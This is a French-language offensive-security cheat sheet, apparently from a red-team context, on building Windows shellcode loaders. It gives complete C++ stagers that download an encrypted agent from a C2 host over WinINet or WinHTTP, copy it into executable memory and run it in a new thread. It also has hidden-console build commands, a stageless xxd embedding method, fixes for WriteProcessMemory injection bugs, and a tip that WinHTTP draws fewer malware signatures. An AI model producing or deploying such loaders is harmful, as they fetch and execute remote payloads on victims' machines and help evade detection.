# Stager
## WinINet

Bibliothèque haut niveau, gère les proxies système automatiquement. Prend une URL complète d'un coup.

```cpp
#include <wininet.h>
// compilation : -lwininet
```

```cpp
void download(LPCWSTR url, std::vector<BYTE>& out)
{
    HINTERNET hNet  = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrlW(hNet, url, NULL, 0,
                          INTERNET_FLAG_HYPERLINK |
                          INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                          INTERNET_FLAG_IGNORE_CERT_CN_INVALID, 0);
    BYTE buf[4096];
    DWORD read;
    while (InternetReadFile(hFile, buf, sizeof(buf), &read) && read)
        out.insert(out.end(), buf, buf + read);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hNet);
}
```

---

## WinHTTP

Bibliothèque bas niveau, moins associée aux malwares dans certaines signatures. Découpe host et path séparément.

```cpp
#include <winhttp.h>
// compilation : -lwinhttp
```

```cpp
void download(LPCWSTR host, LPCWSTR path, std::vector<BYTE>& out)
{
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    BYTE buf[4096];
    DWORD read;
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read)
        out.insert(out.end(), buf, buf + read);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}
```

---
## Exemple complet WinINet

```cpp
#include <Windows.h>
#include <wininet.h>
#include <vector>
#include <string>

int main()
{
    std::vector<BYTE> payload;
    download(L"https://mon-c2/agent.x64.bin.enc", payload);

    auto mem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, payload.data(), payload.size());
    DWORD old;
    VirtualProtect(mem, payload.size(), PAGE_EXECUTE_READ, &old);

    DWORD tid;
    auto hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &tid);
    CloseHandle(hThread);
    Sleep(INFINITE);
}
```

```powershell
g++ stager.cpp -o stager.exe -lwininet -static-libgcc -static-libstdc++ -mwindows
```

---

## Exemple complet WinHTTP

```cpp
#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <string>

int main()
{
    std::vector<BYTE> payload;
    download(L"mon-c2.com", L"/agent.x64.bin.enc", payload);

    auto mem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, payload.data(), payload.size());
    DWORD old;
    VirtualProtect(mem, payload.size(), PAGE_EXECUTE_READ, &old);

    DWORD tid;
    auto hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &tid);
    CloseHandle(hThread);
    Sleep(INFINITE);
}
```

```powershell
g++ stager.cpp -o stager.exe -lwinhttp -static-libgcc -static-libstdc++ -mwindows
```

# Stageless


```bash
sudo apt install xxd
xxd -i agent.x64.bin > shellcode.h
xxd -i agent.x64.bin | tr -s ' \n' ' ' > shellcode.h
```

Sortie :

```cpp
unsigned char agent_x64_bin[] = { 0x4d, 0x5a, ... };
unsigned int agent_x64_bin_len = 1234;
```

Intégration pratique :

```cpp
#include "shellcode.h"

unsigned char* shellcode = agent_x64_bin;
unsigned int shellcode_len = agent_x64_bin_len;
```

Remplacements :

** `sizeof` sur un pointeur**
```cpp
unsigned char* shellcode = agent_x64_bin;
sizeof(shellcode); // retourne 8, taille d'un pointeur x64

// sizeof(shellcode) -> shellcode_len
```

Quand `shellcode` est un pointeur, `sizeof` donne la taille du pointeur et non du buffer. Il faut utiliser `agent_x64_bin_len` fourni par `xxd`.

**`&shellcode` dans WriteProcessMemory**
```cpp
&shellcode // adresse du pointeur lui-même, pas des données
shellcode  // adresse des données, c'est ce qu'il faut

// &shellcode -> shellcode
```

`WriteProcessMemory` écrivait l'adresse du pointeur (8 bytes) dans la mémoire allouée au lieu du shellcode réel. Le thread s'exécutait sur des données invalides, aucun callback.
